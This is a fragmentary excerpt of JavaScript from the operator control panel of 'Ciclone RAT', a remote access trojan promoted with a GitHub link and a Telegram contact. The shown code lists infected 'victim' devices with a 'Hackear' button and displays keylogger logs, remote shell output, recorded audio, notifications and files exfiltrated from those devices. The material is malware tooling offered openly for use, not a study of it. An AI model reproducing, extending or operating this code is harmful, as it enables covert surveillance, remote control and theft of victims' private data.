...
uo2.innerHTML+='<br><div class="usr" >'+model+' <span style="float:right" >'+aversion+'</span><br><br>Roteado: '+ip+' <span style="float:right" >Bateria: '+battery+' </span><br><br><center><button onclick="setdev('+"'"+uid+"'"+')">Hackear</button></center></div> '; 
}
}
else{
uo2.innerHTML="Nenhum aparelho online";
}
});
}
userss();
...
v1="<div class='keylogg'>Sem nenhum Dado</div>";
}
showinfodev(v1);
}
...
pd3.innerHTML="<center> <h3 style='color:red'>•Informações•<h3> </center><br>Projeto Ciclone RAT fonte aberta<b style='color:gold'>Ciclone RAT</b> já disponível no meu repositorio <a href='https://github.com/hackersaprovado/CicloneRAT <style='color:#0f8;'> GitHub </a> Todos direitosreservados @Hackersaprovado.";
pd3.innerHTML+="<br><center><button onclick='this.parentElement.parentElement.parentElement.style.display="+'"none"'+"' style='margin-top:5px;color:white;background:#001;border:1px solid red;border-radius:5px;height:30px;width:150px;margin-bottom:10px;'> Certo </button><br><u style='color:red;font-size:15px;' onclick='dnd(this);'>Não mostrar novamente</u>";
pd2.appendChild(pd3);
function dnd(m){
var date = new Date().toLocaleDateString();
...
pd1.innerHTML="Want More Features Contact at <a href='https://t.me/Mozsystemas' style='color:#0f8;'>@hackeraprovado</a>";
...
pd.innerHTML="&copy; Ciclone RAT 2025";
document.getElementById("tophead").appendChild(pd);
$(".h4").text("HACKERS APROVADO");
...
psdus.innerHTML='<div class="keylogg" ><h4>Sem nenhum Alvo - Vitimas<h4></div>';
}
...
alert("Por favor, coloque tempo válido");
}
}
function playmus(){
...
$("#shellcmd").css("display","block");
$("#shelldata").html("Ciclone RAT Shell<br><br>"+o.replaceAll("\n","<br>"))
...
psdus.innerHTML='<div class="keylogg" ><h4>Sem nenhum audio<h4></div>';
}
...
psdus.innerHTML='<div class="keylogg" ><h4>Sem nenhum áudio<h4></div>';
}
}
}
}
...
psdus.innerHTML+='<div class="keylogg" ><b>Evento: </b>'+event+'<br><br><b>Tempo: </b>'+date+'<br><br><b>Msg: </b>'+msg+"</div>";
}
...
psdus.innerHTML='<div class="keylogg" ><h4>Sem nenhum Log<h4></div>';
}
...
psdus.innerHTML='<div class="keylogg" ><h4>Sem notificações<h4></div>';
}
}
}
...
document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="data:image/png;base64,'+v1+'">Baixar Ficheiro</a><br>';
}
//  ///
...
document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="'+v1+'">Baixar Ficheiro</a><br>';
